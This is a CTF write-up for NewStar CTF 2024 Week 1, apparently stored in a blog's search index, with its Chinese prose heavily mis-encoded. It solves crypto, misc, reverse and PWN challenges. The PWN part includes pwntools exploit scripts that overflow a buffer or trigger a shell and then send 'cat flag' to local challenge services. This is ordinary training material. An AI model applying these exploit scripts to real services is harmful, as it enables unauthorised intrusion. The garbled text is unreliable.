<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Newstar2024</title>
      <link href="/2025/11/18/Newstar/"/>
      <url>/2025/11/18/Newstar/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ„Ÿè§‰åŸºç¡€æœ‰ç‚¹é—®é¢˜ï¼Œä½†æ˜¯å› ä¸ºå‚åŠ äº†25Newstarçš„å‡ºé¢˜è¿˜å¸®æµ‹äº†ä¸€äº›é¢˜ç›®ï¼Œäºæ˜¯å¹²è„†é‡æ–°æ‰“ä¸€éNewstar2024äº†ã€‚</p><p>åº”è¯¥ä¸»è¦æ˜¯Reveresï¼Œcryã€miscã€pwnçœ‹æƒ…å†µå¤ç°ï¼ˆwebå—ä¹ŸåŠ åˆ°todolisté‡Œå§ï¼‰ï¼Œæ„Ÿè§‰Newstar2025 Reverseæœ‰äº›æˆ‘æ²¡æµ‹çš„é¢˜ç›®è¿˜æƒ³åšä¸€ä¸‹ï¼Œæ€»ä¹‹è¿™æ˜¯ä¸€ä¸ªtodolistï¼Œæ–°ç”Ÿèµ›çš„å¹¿åº¦ç¡®å®å¥½ç©ï¼Œé€‚åˆå…¥é—¨ï¼Œèµç¾newstarï¼</p><p>é€†å‘çš„å¯èƒ½å†™çš„ç®€ç•¥ä¸€ç‚¹ï¼Œé€†å‘ä¸»è¦ç»ƒä»£ç èƒ½åŠ›ï¼Œå…¶ä»–æ–¹å‘ä»¥å­¦ä¹ ä¸ºä¸»</p><p>å¤ç°å…¥å£ï¼š<a href="https://ctf.xidian.edu.cn/training/14">https://ctf.xidian.edu.cn/training/14</a></p><p>æˆ‘çš„è¿›åº¦æ¯”æˆ‘æƒ³çš„æ…¢å¥½å¤šå¯æ¶TT</p><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4C4A575851324332474E324547554B494A5A4446513653434E564D444154545A4B354D45454D434E4959345536544B474D5134513D3D3D3D</span><br></pre></td></tr></table></figure><p>cyberchef from hex + magic<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;B@sE_0f_CrYpt0_N0W&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Strange-King"><a href="#Strange-King" class="headerlink" title="Strange King"></a>Strange King</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ksjr&#123;EcxvpdErSvcDgdgEzxqjql&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿå¾—æ˜¯å‡¯æ’’ï¼Œæ ¹æ®å‰å››ä½ä¸ºflagå¾—ä½ç§»åˆ†åˆ«ä¸º5ï¼Œ7ï¼Œ9ï¼Œ11ï¼Œä»¥æ­¤ç±»æ¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RngcugFqPqvUvqrNgctkpi&#125;</span><br></pre></td></tr></table></figure><br>å› ä¸ºflagæœ‰æ„ä¹‰ï¼Œéšæ³¢é€æµä¸€ä¸‹<br>flag{PleaseDoNotStopLearing}</p><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag[:<span class="number">13</span>], encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">c1 = m1 ^ bytes_to_long(key)</span><br></pre></td></tr></table></figure><p>å–flagçš„å‰13å­—èŠ‚å½“æˆä¸€ä¸ªå¤§æ•´æ•°ï¼Œåšæ³•æ˜¯ä¸ºäº†æŠŠè¿™ä¸€æ®µï¼ˆ13å­—èŠ‚ï¼‰å½“æˆä¸€ä¸ªå¤§å­—èŠ‚æ¥å¼‚æˆ–ã€‚<br>æŠŠkey ä¹Ÿ<code>bytes_to_long</code>è½¬ä¸ºæ•´æ•°ï¼Œç„¶åä¸ m1 åšæŒ‰ä½å¼‚æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m2 = flag[<span class="number">13</span>:]</span><br><span class="line">c2 = xor(key, m2)</span><br></pre></td></tr></table></figure><p>å–å‰©ä¸‹çš„å­—èŠ‚ï¼Œè¿™é‡Œm2æ˜¯<code>str</code><br>è¿™é‡Œkeyæ˜¯<code>bytes</code>ï¼Œm2æ˜¯<code>str</code>ï¼Œpwntoolsçš„xorä¼šæŠŠä¸¤è€…å¤„ç†æˆbyteså¹¶å¯¹keyå¾ªç¯é‡å¤æ¥åŒ¹é…m2çš„é•¿åº¦ã€‚<br>é‚£ä¹ˆ</p><p>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c1 = m1 ^ bytes_to_long(key)</span></span><br><span class="line"><span class="comment"># c2 = xor(key, m2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line">key = <span class="string">b&#x27;New_Star_CTF&#x27;</span></span><br><span class="line">c1= <span class="number">8091799978721254458294926060841</span></span><br><span class="line">c2= <span class="string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span></span><br><span class="line"></span><br><span class="line">m1 = c1 ^ bytes_to_long(key)</span><br><span class="line">m1_bytes = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:])</span><br><span class="line">m2 = xor(key, c2)</span><br><span class="line"><span class="built_in">print</span>(m1_bytes + m2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;0ops!_you_know_XOR!&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="ä¸€çœ¼ç§’äº†"><a href="#ä¸€çœ¼ç§’äº†" class="headerlink" title="ä¸€çœ¼ç§’äº†"></a>ä¸€çœ¼ç§’äº†</h3><p><code>getPrime()</code>ç”Ÿæˆä¸€ä¸ªéšæœºç´ æ•°ï¼Œ<code>n = p*q</code> RSAå…¬é’¥æ¨¡æ•°nï¼Œ<code>powmod(m, e, n)</code>è®¡ç®—å¯†æ–‡ <code>c = m^e mod n</code><br><a href="https://factordb.com/">https://factordb.com/</a><br>åˆ†è§£å¾—åˆ°ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><span class="line">q = 7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span><br></pre></td></tr></table></figure><br>ç°åœ¨å·²çŸ¥ ğ‘,ğ‘,ğ‘›,ğ‘,ğ‘’ï¼Œå¯ä»¥å®Œå…¨ç ´è§£RSAã€‚<br>å› ä¸º<script type="math/tex">Ï†(n)=(pâˆ’1)(qâˆ’1)</script>  <script type="math/tex">dâ‰¡e^{âˆ’1}(modÏ†(n))</script> æ‰€ä»¥<script type="math/tex">dâ‹…eâ‰¡1(modÏ†(n))</script>  ç”±è´¹é©¬å°å®šç†ï¼šå¯¹åŸå§‹æ˜æ–‡ <script type="math/tex">m^{ed} â‰¡ m(modn)</script>å¾—<script type="math/tex">mâ‰¡c^d(modn)</script></p><blockquote><p>æ¬§æ‹‰å‡½æ•°<strong>Ï†(n)</strong> æ¥è¡¨ç¤º <strong>å°äºnå¹¶ä¸ä¹‹äº’è´¨</strong>çš„æ­£æ•´æ•°<br>    1ã€ å¦‚æœn æ˜¯è´¨æ•°ï¼Œåˆ™Ï† ( n ) = n âˆ’ 1<br>    2ã€ å¦‚æœnå¯ä»¥è¡¨ç¤ºæˆ2ä¸ªäº’è´¨çš„æ•°çš„ä¹˜ç§¯ï¼Œå³n = p Ã— qï¼Œé‚£ä¹ˆÏ† ( n ) = Ï† ( p ) Ã— Ï† ( q ) </p></blockquote><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line">c=<span class="number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">int</span>(powmod(c, d, n)) </span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;9cd4b35a-affc-422a-9862-58e1cc3ff8d2&#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><p>æ‰“äº†LSBéšå†™çš„æ ‡ç­¾ï¼Œç”¨stegsloveå‘ç°red plane 0æ—¶å‘ç°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«äº†ä¸€ä¸‹å¾—åˆ°flag<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e33bb7a1-ac94-4d15-8ff7-fd8c88547b43&#125;</span><br></pre></td></tr></table></figure></p><h3 id="WhereIsFlag"><a href="#WhereIsFlag" class="headerlink" title="WhereIsFlag"></a>WhereIsFlag</h3><p>è¥¿ç”µçš„è¿œç¨‹ç¡®å®æœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ç°åœ¨ä¸‹ä»–ä»¬é‚£ä¸ªè½¯ä»¶è¿˜æ²¡è¥¿ç”µé‚£ä¸ªè¡¨å¾—è‡ªå·±æ˜ å°„æ¬¸ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">guest@ret2shell-578-7189-1762936515 guest/&gt; <span class="built_in">cat</span> fake_flag_in_user_home</span><br><span class="line">fake_flag&#123;fake_flag&#125;</span><br></pre></td></tr></table></figure><br>ç»·ä¸ä½<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">guest@ret2shell-578-7189-1762936515 self/&gt; <span class="built_in">cat</span> environ</span><br><span class="line">THE_REAL_FLAG_IN_ENVIRON =&gt; flag&#123;neWst4R-Ctf-Z0ZA34546c39eef5&#125;</span><br></pre></td></tr></table></figure></p><h3 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h3><p>ç¡®å®ç¬¬ä¸€æ¬¡è§åˆ†å·å‹ç¼©åŒ…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([a-z])&#123;3&#125;\d[a-z]$</span><br></pre></td></tr></table></figure><br>æ­£åˆ™åŒ¹é…â€œ3ä¸ªå°å†™å­—æ¯ + 1ä¸ªæ•°å­— + 1ä¸ªå°å†™å­—æ¯â€ï¼Œçˆ†ç ´å¯†ç <br>æ©ç æ ¼å¼<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?l?l?l?d?l</span><br></pre></td></tr></table></figure></p><h3 id="pleasingMusic"><a href="#pleasingMusic" class="headerlink" title="pleasingMusic"></a>pleasingMusic</h3><p>æŒºå¥½å¬çš„ï¼Œå¬äº†ä¸€ä¸‹ä¸­é—´å¤¹äº†æ‘©æ–¯å¯†ç ï¼Œæ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™ã€‚<br><a href="https://morsecodegenerator.org/zh/morse-audio-translator">https://morsecodegenerator.org/zh/morse-audio-translator</a><br>ä¸å¤ªå¯¹ï¼Œå€’ç½®è§£è¯»å¾—åˆ°<code>EZ_MORSE_CODE</code></p><h3 id="å…‘æ¢ç "><a href="#å…‘æ¢ç " class="headerlink" title="å…‘æ¢ç "></a>å…‘æ¢ç </h3><p>æç¤ºå®½é«˜æ”¹å†™ï¼Œæ”¹ä¸ªé«˜åº¦å°±è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;La_vaguelette&#125;</span><br></pre></td></tr></table></figure></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>ä¸€å¹´è¿‡å»çœ‹åˆ°pwné¢˜çš„ç¬¬ä¸€æƒ³æ³•è¿˜æ˜¯æƒ³patchï¼ˆï¼‰<br>æ¯è½®è¯»å–ä¸€ä¸ªintï¼Œ<code>n10 &lt; 0 || n10 &gt; 10</code>åˆ™è·³å‡ºå¾ªç¯ï¼Œä¸”ä¸€å¼€å§‹è°ƒç”¨äº†<code>alarm(5u)</code>,è¿›ç¨‹åœ¨ 5 ç§’åä¼šè¢« SIGALRM,å†™ä¸ªè„šæœ¬å‘å°±è¡Œã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  n999 = <span class="number">0</span>;</span><br><span class="line">  n10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a game!&quot;</span>);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">5u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pls input you num: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n10);</span><br><span class="line">    <span class="keyword">if</span> ( n10 &lt; <span class="number">0</span> || n10 &gt; <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    n999 += n10;</span><br><span class="line">    <span class="keyword">if</span> ( n999 &gt; <span class="number">999</span> )</span><br><span class="line">      <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">Host=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="number">64596</span></span><br><span class="line">p=remote(Host,port,timeout=<span class="number">10</span>)</span><br><span class="line">payload=(<span class="string">&quot;10\n&quot;</span>*<span class="number">100</span>).encode()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;n3W5t@R_cTf_20ZA323c4f600356&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="real-login"><a href="#real-login" class="headerlink" title="real login"></a>real login</h3><p>å‘NewStar!!!å°±è¡Œï¼Œç”¨çš„windowsæ‰€ä»¥å†™è„šæœ¬äº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">53636</span>, timeout=<span class="number">5</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;NewStar!!!&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;congratulations!!&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(timeout=<span class="number">1</span>).decode())</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;n3wstar-cTf-2O2Afac8a376cf8&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>æŠŠ s è®¾ä¸º â€œ0d000721â€ï¼ŒæŠŠ mysecretkey123â€¦ æ”¾åˆ°æ ˆä¸Šï¼Œç„¶åè°ƒç”¨ sub_12E5(s, len(s), key) æŠŠ sâ€œåŠ å¯†/å˜æ¢â€æˆæŸä¸ªå€¼ï¼›æ¥ç€ç¨‹åºæç¤ºä½  Input your encrypted data:ï¼ŒæŠŠè¾“å…¥çš„å†…å®¹ä¸å†…å­˜é‡Œè¢«å˜æ¢åçš„ s åš memcmpï¼ˆæŒ‰ n = strlen(s) æ¯”è¾ƒï¼‰ï¼Œç›¸ç­‰å°±ä¼šæ‰“å° Congratulations! å¹¶æŠŠ /flag çš„å†…å®¹è¯»å‡ºæ¥å†™åˆ° stdoutã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+0h] [rbp-440h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">9</span>]; <span class="comment">// [rsp+7h] [rbp-439h] BYREF</span></span><br><span class="line">  _QWORD mysecretkey1234567890abcdefghijk[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-430h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">1032</span>]; <span class="comment">// [rsp+30h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+438h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;0d000721&quot;</span>);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(</span><br><span class="line">    mysecretkey1234567890abcdefghijk,</span><br><span class="line">    <span class="string">&quot;mysecretkey1234567890abcdefghijk&quot;</span>,</span><br><span class="line">    <span class="built_in">sizeof</span>(mysecretkey1234567890abcdefghijk));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original: %s\n&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">sub_12E5</span>(s, v3, mysecretkey1234567890abcdefghijk);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your encrypted data: &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200uLL</span>);</span><br><span class="line">  n = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(s, buf, n) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x100uLL</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x100uLL</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="number">0x100uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdbè°ƒä¸€ä¸‹ï¼Œæœ‰åŸºåœ°å€åç§»ç”¨<code>bbase 0x1847</code>,æŠŠsç›´æ¥è¯»å‡ºæ¥æ˜¯0x4557455355431d5dï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">58367</span>, timeout=<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input your encrypted data:&quot;</span>)</span><br><span class="line">num=<span class="number">0x4557455355431d5d</span></span><br><span class="line">payload=p64(num)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Congratulations!&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(timeout=<span class="number">1</span>).decode())</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;0579be01-51a9-794e-9a64-7c153971d282&#125;</span></span><br></pre></td></tr></table></figure><h3 id="overwrite"><a href="#overwrite" class="headerlink" title="overwrite"></a>overwrite</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">49457</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;pls input the length you want to readin: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x30</span> + <span class="string">b&quot;114515&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;pls input want you want to say: &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;nEwstAR_ctf-ZOZ417265830925b&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cipher=[<span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xa4</span>, <span class="number">0x1c</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, </span><br><span class="line">        <span class="number">0x7</span>, <span class="number">0x14</span>, <span class="number">0x6a</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xa2</span>, <span class="number">0xa</span>, <span class="number">0x37</span>, <span class="number">0x5c</span>, <span class="number">0x7</span>, <span class="number">0x5a</span>, <span class="number">0x56</span>, </span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8e</span>, <span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#   for ( j = 0; j &lt; len; ++j )</span></span><br><span class="line"><span class="comment">#   &#123;</span></span><br><span class="line"><span class="comment">#     if ( !(j % 3) )</span></span><br><span class="line"><span class="comment">#       input[j] -= 0x1F;</span></span><br><span class="line"><span class="comment">#     if ( j % 3 == 1 )</span></span><br><span class="line"><span class="comment">#       input[j] += 0x29;</span></span><br><span class="line"><span class="comment">#     if ( j % 3 == 2 )</span></span><br><span class="line"><span class="comment">#       input[j] ^= 0x55u;</span></span><br><span class="line"><span class="comment">#   &#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        cipher[i] += <span class="number">0x1F</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        cipher[i] -= <span class="number">0x29</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher[i] ^= <span class="number">0x55</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(cipher[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;IT_15_R3Al1y_V3Ry-51Mp1e&#125;</span></span><br></pre></td></tr></table></figure><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span 